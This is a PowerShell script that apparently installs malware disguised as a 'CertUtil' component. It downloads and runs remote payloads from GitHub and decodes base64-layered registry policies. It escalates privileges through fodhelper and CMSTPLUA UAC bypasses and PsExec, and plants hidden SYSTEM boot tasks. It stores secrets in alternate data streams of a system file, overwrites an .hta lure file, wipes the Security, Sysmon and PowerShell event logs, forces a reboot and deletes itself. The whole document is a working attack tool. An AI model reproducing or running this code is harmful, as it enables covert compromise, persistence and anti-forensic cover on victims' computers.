[CmdletBinding()]
param(
    [switch]$ApplyPolicy,
    [switch]$Resume,
    [switch]$Clean
)

$ErrorActionPreference = 'SilentlyContinue'

$sharedScriptPath = "$env:PUBLIC\autoexec.ps1"
$policyRegUrl = "https://github.com/Novella2048/CertUtil/raw/refs/heads/main/policies.reg"
$zipUrl = "https://github.com/Novella2048/CertUtil/raw/refs/heads/main/CertUtil.zip"
$pstoolsUrl = "https://download.sysinternals.com/files/PSTools.zip"
$programBase = "$env:PROGRAMDATA\CertUtil"
$zipCache = "$env:TEMP\CertUtil.zip"

$is64 = (Get-CimInstance Win32_OperatingSystem).OSArchitecture -match '64'
$psexecPath = "$programBase\CertExec.exe"
$powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$cmdPath = "$env:SystemRoot\System32\cmd.exe"
$tempPwsh = "$env:TEMP\CertAudio.exe"
$tempCmd = "$env:TEMP\CertConnections.exe"

function Test-IsSystem {
    return [Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18"
}

function Test-IsAdmin {
    return [Security.Principal.WindowsPrincipal]::new(
        [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Copy-ExecutablesToTemp {
    if (-not (Test-Path $programBase)) { New-Item -ItemType Directory -Path $programBase -Force | Out-Null }
    $ok = $true
    if (-not ((Test-Path $powershellPath) -and (Test-Path $tempPwsh))) {
        if (Test-Path $powershellPath) {
            try { Copy-Item -Path $powershellPath -Destination $tempPwsh -Force -ErrorAction Stop } catch { $ok = $false }
        } else { $ok = $false }
    }
    if (-not ((Test-Path $cmdPath) -and (Test-Path $tempCmd))) {
        if (Test-Path $cmdPath) {
            try { Copy-Item -Path $cmdPath -Destination $tempCmd -Force -ErrorAction Stop } catch { $ok = $false }
        } else { $ok = $false }
    }
    return $ok
}

function Download-File {
    param([string]$Url, [string]$OutPath, [int]$Retries = 3)
    if (Test-Path $OutPath) { Remove-Item $OutPath -Force -ErrorAction SilentlyContinue }
    for ($i = 1; $i -le $Retries; $i++) {
        try {
            (New-Object System.Net.WebClient).DownloadFile($Url, $OutPath)
            if (Test-Path $OutPath) { return $true }
        } catch {
            if ($i -lt $Retries) { Start-Sleep -Seconds 3 }
        }
    }
    return $false
}

function Download-AndExtractPsExec {
    try {
        if (-not (Test-Path $programBase)) { New-Item -ItemType Directory -Path $programBase -Force | Out-Null }
        $zipPath = "$programBase\PSTools.zip"
        if (-not (Download-File -Url $pstoolsUrl -OutPath $zipPath)) { return $false }
        if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
            Expand-Archive -Path $zipPath -DestinationPath "$programBase\PSTools" -Force
        } else {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, "$programBase\PSTools")
        }
        $psexecSource = if ($is64) {
            Get-ChildItem -Path "$programBase\PSTools" -Recurse -Filter "PsExec64.exe" | Select-Object -First 1
        } else {
            Get-ChildItem -Path "$programBase\PSTools" -Recurse -Filter "PsExec.exe" | Select-Object -First 1
        }
        if (-not $psexecSource) { return $false }
        Copy-Item -Path $psexecSource.FullName -Destination $psexecPath -Force
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        Remove-Item "$programBase\PSTools" -Recurse -Force -ErrorAction SilentlyContinue
        return $true
    } catch { return $false }
}

function Convert-PolicyReg {
    param([string]$Path)
    try {
        $content = Get-Content -Path $Path -Raw -ErrorAction Stop
        $stripped = $content -replace '\s', ''
        function Try-DecodeBase64 {
            param([string]$Data)
            try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Data)) } catch { return $null }
        }
        if (($stripped -match '^[A-Za-z0-9+/=]+$') -and ($stripped.Length % 4 -eq 0)) {
            $layer1 = Try-DecodeBase64 -Data $stripped
            if ($layer1) {
                if ($layer1 -match '(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----') {
                    $innerB64 = $matches[1] -replace '\s', ''
                    $layer2 = Try-DecodeBase64 -Data $innerB64
                    if ($layer2 -and ($layer2 -match 'Windows Registry Editor|^\[HKEY_')) {
                        $outPath = [System.IO.Path]::ChangeExtension($Path, 'decoded.reg')
                        $layer2 | Out-File -FilePath $outPath -Encoding ascii -Force
                        return $outPath
                    }
                }
                if ($layer1 -match 'Windows Registry Editor|^\[HKEY_') {
                    $outPath = [System.IO.Path]::ChangeExtension($Path, 'decoded.reg')
                    $layer1 | Out-File -FilePath $outPath -Encoding ascii -Force
                    return $outPath
                }
            }
        }
        return $Path
    } catch { return $Path }
}

function Start-Fod {
    param([string]$CommandToExecute)
    try {
        $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
        if (Test-Path "HKCU:\Software\Classes\ms-settings") {
            Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "(default)" -Value $CommandToExecute -Force
        New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 2
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        return $true
    } catch { return $false }
}

function Start-Cmstp {
    param([string]$CommandToExecute)
    $toolPath = "$env:TEMP\cmstp_bypass.exe"
    $url = if ($is64) {
        "https://github.com/tijme/cmstplua-uac-bypass/raw/master/UACBypassCMSTPLUA.x64.exe"
    } else {
        "https://github.com/tijme/cmstplua-uac-bypass/raw/master/UACBypassCMSTPLUA.x86.exe"
    }
    try {
        (New-Object System.Net.WebClient).DownloadFile($url, $toolPath)
        if (-not (Test-Path $toolPath)) { return $false }
        Start-Process -FilePath $toolPath -ArgumentList $CommandToExecute -WindowStyle Hidden
        Start-Sleep -Seconds 3
        Remove-Item $toolPath -Force -ErrorAction SilentlyContinue
        return $true
    } catch { return $false }
}

function New-ResumeTask {
    $action = New-ScheduledTaskAction -Execute $tempPwsh -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$sharedScriptPath`" -Resume"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType S4U -RunLevel Highest
    try {
        Unregister-ScheduledTask -TaskName "CertUtilResume" -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName "CertUtilResume" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction Stop
        return $true
    } catch {
        try {
            $xmlPath = "$env:TEMP\resume_task.xml"
            $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Settings><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>"$tempPwsh"</Command><Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "$sharedScriptPath" -Resume</Arguments></Exec></Actions>
   <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel><UserId>SYSTEM</UserId><LogonType>S4U</LogonType></Principal></Principals>
</Task>
"@
            $xml | Out-File -FilePath $xmlPath -Encoding unicode -Force
            & schtasks /create /tn "CertUtilResume" /xml $xmlPath /f 2>&1 | Out-Null
            Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
            return $true
        } catch { return $false }
    }
}

function Remove-ResumeTask {
    try {
        $existing = Get-ScheduledTask -TaskName "CertUtilResume" -ErrorAction SilentlyContinue
        if ($existing) { Unregister-ScheduledTask -TaskName "CertUtilResume" -Confirm:$false -ErrorAction Stop }
    } catch { & schtasks /delete /tn "CertUtilResume" /f 2>&1 | Out-Null }
}

function Extract-And-Install {
    Remove-Item $programBase -Recurse -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    New-Item -ItemType Directory -Path $programBase -Force | Out-Null

    if (-not (Download-File -Url $zipUrl -OutPath $zipCache)) { return $false }

    try {
        $bytes = [System.IO.File]::ReadAllBytes($zipCache)
        if ($bytes[0] -ne 0x50 -or $bytes[1] -ne 0x4b -or $bytes[2] -ne 0x03 -or $bytes[3] -ne 0x04) { return $false }
    } catch { return $false }

    try {
        if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
            Expand-Archive -Path $zipCache -DestinationPath $programBase -Force
        } else {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($zipCache, $programBase)
        }
    } catch { return $false }

    $subFolder = Get-ChildItem $programBase -Directory | Where-Object { $_.Name -like "*CertUtil*" } | Select-Object -First 1
    if ($subFolder) {
        Get-ChildItem $subFolder.FullName | ForEach-Object {
            $dest = Join-Path $programBase $_.Name
            try { Copy-Item -Path $_.FullName -Destination $dest -Force -Recurse -ErrorAction Stop } catch {}
        }
        Remove-Item $subFolder.FullName -Recurse -Force -ErrorAction SilentlyContinue
    }

    $file64 = "$programBase\certutil64.exe"
    $file32 = "$programBase\certutil32.exe"
    $target = "$programBase\certutil.exe"

    if ($is64) {
        if (Test-Path $file64) {
            Move-Item -Path $file64 -Destination $target -Force -ErrorAction SilentlyContinue
        } else {
            return $false
        }
        Remove-Item -Path $file32 -Force -ErrorAction SilentlyContinue
    } else {
        if (Test-Path $file32) {
            Move-Item -Path $file32 -Destination $target -Force -ErrorAction SilentlyContinue
        } else {
            return $false
        }
        Remove-Item -Path $file64 -Force -ErrorAction SilentlyContinue
    }

    if (-not (Test-Path $target)) {
        $found = Get-ChildItem -Path $programBase -Recurse -Include "certutil.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) {
            Move-Item -Path $found.FullName -Destination $target -Force
            Remove-Item -Path $file64, $file32 -Force -ErrorAction SilentlyContinue
        } else {
            return $false
        }
    }

    $start64 = "$programBase\CertStart64.exe"
    $start32 = "$programBase\CertStart32.exe"
    $startTarget = "$programBase\CertStart.exe"

    if ($is64) {
        if (Test-Path $start64) {
            Move-Item -Path $start64 -Destination $startTarget -Force -ErrorAction SilentlyContinue
        }
        Remove-Item -Path $start32 -Force -ErrorAction SilentlyContinue
    } else {
        if (Test-Path $start32) {
            Move-Item -Path $start32 -Destination $startTarget -Force -ErrorAction SilentlyContinue
        }
        Remove-Item -Path $start64 -Force -ErrorAction SilentlyContinue
    }

    $xorKeyPath = "$programBase\xr9999.blob"
    $tkPath = "$programBase\tk9999.blob"
    if (-not (Test-Path $xorKeyPath) -or -not (Test-Path $tkPath)) { return $false }

    $xorKeyBytes = [System.IO.File]::ReadAllBytes($xorKeyPath)
    $tokenBytes = [System.IO.File]::ReadAllBytes($tkPath)
    if (-not $xorKeyBytes -or $xorKeyBytes.Count -eq 0) { return $false }
    if (-not $tokenBytes -or $tokenBytes.Count -eq 0) { return $false }

    $xorKeyRaw = [System.Text.Encoding]::UTF8.GetString($xorKeyBytes)
    $tokenEnc = [System.Text.Encoding]::UTF8.GetString($tokenBytes)

    $licensePath = "C:\Windows\System32\License.rtf"
    if (-not (Test-Path $licensePath)) { New-Item -ItemType File -Path $licensePath -Force | Out-Null }
    Set-Content -Path $licensePath -Stream "CertKey" -Value $xorKeyRaw -Encoding ASCII -NoNewline -Force
    Set-Content -Path $licensePath -Stream "CertToken" -Value $tokenEnc -Encoding ASCII -NoNewline -Force

    $testKey = Get-Content -Path $licensePath -Stream "CertKey" -Raw -ErrorAction SilentlyContinue
    $testToken = Get-Content -Path $licensePath -Stream "CertToken" -Raw -ErrorAction SilentlyContinue
    if ($testKey -ne $xorKeyRaw -or $testToken -ne $tokenEnc) { return $false }

    Get-ChildItem -Path $programBase -Recurse -File | Where-Object { $_.Extension -ne '.log' } | ForEach-Object {
        Set-ItemProperty -Path $_.FullName -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -Force
    }
    Get-ChildItem -Path $programBase -Directory | Where-Object { $_.FullName -ne $programBase } | ForEach-Object {
        Set-ItemProperty -Path $_.FullName -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -Force
    }

    return $true
}

function Install-BootTask {
    param(
        [string]$ExePath,
        [string]$Arguments = ""
    )
    $bootTaskName = "CertUtil"
    if (-not (Test-Path $ExePath)) { return $false }
    try {
        Unregister-ScheduledTask -TaskName $bootTaskName -Confirm:$false -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute $ExePath -Argument $Arguments  
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType S4U -RunLevel Highest
        Register-ScheduledTask -TaskName $bootTaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction Stop
        & schtasks /run /tn $bootTaskName 2>&1 | Out-Null
        return $true
    } catch {
        try {
            $xmlPath = "$env:TEMP\boot_task.xml"
            $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Settings><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>"$ExePath"</Command><Arguments>$Arguments</Arguments></Exec></Actions>
   <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel><UserId>SYSTEM</UserId><LogonType>S4U</LogonType></Principal></Principals>
</Task>
"@
            $xml | Out-File -FilePath $xmlPath -Encoding unicode -Force
            & schtasks /create /tn $bootTaskName /xml $xmlPath /f 2>&1 | Out-Null
            Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
            & schtasks /run /tn $bootTaskName 2>&1 | Out-Null
            return $true
        } catch { return $false }
    }
}

function Finalize-Install {
    & sc.exe stop "CertUtil" 2>&1 | Out-Null
    Start-Sleep -Seconds 1
    & sc.exe delete "CertUtil" 2>&1 | Out-Null
    Start-Sleep -Seconds 1
    
    try {
        $dfPath = Join-Path $env:USERPROFILE 'Downloads\Microsoft_Security_Report.hta'
        
        if (-not (Test-Path $dfPath)) {
            $dfPath = Get-ChildItem -Path "$env:USERPROFILE\Downloads" -Filter *.hta `
                Sort-Object LastWriteTime -Descending `
                Select-Object -First 1 -ExpandProperty FullName
        }

        if ($dfPath -and (Test-Path $dfPath)) {
            Set-Content -Path $dfPath -Value "MFA:f10fnsSak13" -Encoding UTF8 -Force
        }
    } catch {
    
    }

    $certPath = "$programBase\certutil.exe"
    $starter = "$programBase\CertStart.exe"

    if (Test-Path $starter) {
        Install-BootTask -ExePath $starter -Arguments "`"$certPath`" C:\Windows\System32\certutil.exe"
    } else {
        if (Test-Path $certPath) {
            Install-BootTask -ExePath $certPath
        }
    }

    $flagPath = "HKLM:\Software\CertUtil"
    if (-not (Test-Path $flagPath)) { New-Item -Path $flagPath -Force | Out-Null }
    Set-ItemProperty -Path $flagPath -Name "Installed" -Value 1 -Force

    $xorKeyPath = "$programBase\xr9999.blob"
    if (Test-Path $xorKeyPath) {
        $null = [System.IO.File]::WriteAllBytes($xorKeyPath, (New-Object byte[] 4096))
        Remove-Item $xorKeyPath -Force -ErrorAction SilentlyContinue
    }
    $tkPath = "$programBase\tk9999.blob"
    if (Test-Path $tkPath) {
        $null = [System.IO.File]::WriteAllBytes($tkPath, (New-Object byte[] 4096))
        Remove-Item $tkPath -Force -ErrorAction SilentlyContinue
    }
    try {
        Clear-EventLog -LogName Security
        Clear-EventLog -LogName "Microsoft-Windows-Sysmon/Operational"
        Clear-EventLog -LogName "Microsoft-Windows-PowerShell/Operational"
        Clear-EventLog -LogName Application
    } catch {
        
    }
}

function Cleanup-Environment {
    & sc.exe stop "CertUtil" 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    & sc.exe delete "CertUtil" 2>&1 | Out-Null

    try { Unregister-ScheduledTask -TaskName "CertUtil" -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    Remove-ResumeTask

    if (Test-Path $programBase) {
        Remove-Item $programBase -Recurse -Force -ErrorAction SilentlyContinue
    }

    $licensePath = "C:\Windows\System32\License.rtf"
    if (Test-Path $licensePath) {
        Get-Item -Path $licensePath -Stream * -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Stream -ne ':$DATA') {
                Remove-Item -Path $licensePath -Stream $_.Stream -Force -ErrorAction SilentlyContinue
            }
        }
    }

    $flagPath = "HKLM:\Software\CertUtil"
    if (Test-Path $flagPath) { Remove-Item $flagPath -Recurse -Force -ErrorAction SilentlyContinue }
}

function Reboot-System {
    Start-Sleep -Seconds 60
    Start-Process -FilePath "shutdown.exe" -ArgumentList "/r /t 0 /f" -WindowStyle Hidden
}

function SelfDestruct {
    $paths = @($scriptPath, $sharedScriptPath, "$env:PUBLIC\autoexec.ps1")
    foreach ($p in $paths) {
        if (Test-Path $p) {
            Start-Process -WindowStyle Hidden -FilePath $tempCmd -ArgumentList "/c timeout 1 >nul && del /f /q `"$p`""
        }
    }
}

Copy-ExecutablesToTemp | Out-Null

if ($Clean) {
    Cleanup-Environment
    SelfDestruct   
    exit 0
}

if ($Resume) {
    $extractOk = Extract-And-Install
    if ($extractOk) {
        Finalize-Install
        Remove-ResumeTask
        SelfDestruct
    } else {
        Start-Sleep -Seconds 60
        $extractOk = Extract-And-Install
        if ($extractOk) {
            Finalize-Install
        }
        Remove-ResumeTask
    }
    exit 0
}

if ($ApplyPolicy) {
    $regFile = "$env:TEMP\policy.decoded.reg"
    if (Test-Path $regFile) {
        if (Test-IsSystem) {
            Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$regFile`"" -Wait -WindowStyle Hidden
        } else {
            if (-not (Test-Path $psexecPath)) { $null = Download-AndExtractPsExec }
            if (Test-Path $psexecPath) {
                Start-Process -FilePath $psexecPath -ArgumentList "-accepteula -s -i regedit.exe /s `"$regFile`"" -Wait -WindowStyle Hidden
            } else {
                SelfDestruct
                exit 1
            }
        }
    } else {
        SelfDestruct
        exit 1
    }
    New-ResumeTask | Out-Null
    Reboot-System
    exit 0
}

if (Test-IsSystem) {
    Finalize-Install
    exit 0
}

if (-not (Test-Path $psexecPath)) {
    $null = Download-AndExtractPsExec
}

$policyRegLocal = "$env:TEMP\policy.reg"
if (Download-File -Url $policyRegUrl -OutPath $policyRegLocal) {
    $decodedReg = Convert-PolicyReg -Path $policyRegLocal
}

if (Test-IsAdmin) {
    Extract-And-Install
    $applyCmd = "$psexecPath -accepteula -s -i $powershellPath -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$sharedScriptPath`" -ApplyPolicy"
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $applyCmd" -WindowStyle Hidden -Wait
    New-ResumeTask | Out-Null
    Reboot-System
    exit 0
}

$elevateCmd = "$tempPwsh -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$sharedScriptPath`" -ApplyPolicy"
$bypassSuccess = Start-Fod -CommandToExecute $elevateCmd
if (-not $bypassSuccess) { $bypassSuccess = Start-Cmstp -CommandToExecute $elevateCmd }
if ($bypassSuccess) {
    Start-Sleep -Seconds 120
    exit 0
} else {
    SelfDestruct
    exit 1
}